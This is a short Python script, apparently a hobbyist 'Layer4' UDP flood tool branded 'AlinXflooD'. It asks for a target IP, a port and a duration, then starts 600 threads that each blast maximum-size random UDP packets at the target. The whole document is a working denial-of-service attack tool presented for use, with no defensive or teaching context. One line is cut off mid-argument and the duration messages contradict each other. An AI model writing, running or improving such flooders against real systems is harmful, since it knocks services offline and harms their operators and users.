import socket
import threading
import time
import random
import os
os.system('clear')
os.system('figlet AlinXflooD')
def udp_attack(ip, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(65507)
    end_time = time.time() + duration
    total_data_sent = 5024
    while time.time() < end_time:
        try:
            for _ in range(8000):
                client.sendto(bytes_data, (ip, port))
                total_data_sent += len(bytes_data)
            print(f"[Attack] Sending Attack Succesfully")
            time.sleep(0.001)
        except Exception as e:
            print(f"[UDP Error] {e}")
            break
def main():
    print("---------[ Layer4 c2-Api ]---------")
    ip = input("Send Ip Target: ").strip()
    port = int(input("Target Port: "))
    duration = int(input("Duration (Max 40s): "))
    if duration > 40:
        print("Duration Max(1-820seconds)!")
        return
    print(f"Attack UDP By AlinnC2-Api")
    threads = []
    for _ in range(600):
        t = threading.Thread(target=udp_attack, args=(ip, port, durati>
        threads.append(t)
        t.start()
    for thread in threads:
        thread.join()
    print("Attack Succesfully By AlynnXflooD")
if __name__ == "__main__":
    main()